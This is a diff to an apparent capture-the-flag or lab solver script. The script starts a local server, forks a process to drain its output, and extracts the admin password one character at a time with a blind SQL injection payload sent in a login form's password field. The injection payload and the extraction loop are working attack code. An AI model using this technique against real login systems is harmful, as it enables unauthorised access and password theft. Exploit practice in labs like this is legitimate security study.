@@ -119,6 +119,7 @@ os.close(w1)
 
 read_file = os.fdopen(r1, "r")
 
+# check server running
 while True:
 	line = read_file.readline()
 	print(line, end="")
@@ -126,6 +127,18 @@ while True:
 	m = pat0.match(line)
 	if m:
 		break
+# read server output in background to prevent buffered stdout from clogging pipe and freezing server
+# we have to do it this way, since we can not override the stdout buffering mode for
+# the subprocess python script and hence the print(f"DEBUG: {query=}") breaks the server
+pid = os.fork()
+
+if pid == -1:
+	print("Error fork.", file=sys.stderr)
+	exit(1)
+
+if pid == 0:
+	while True:
+		print(read_file.readline())
 
 while True:
 	guess = flag + alphabet[j]
@@ -134,7 +147,6 @@ while True:
 	data = {"username": "admin", "password": f'" OR (SELECT substr(password,1,{len(guess)}) FROM users WHERE username = "admin") = "{guess}" --'}
 	print(data["password"])
 	resp = requests.post(url, data=data, allow_redirects=False)
-	read_file.flush()
 
 	if resp.status_code == 403:
 		print(f"{guess} {j} 403")
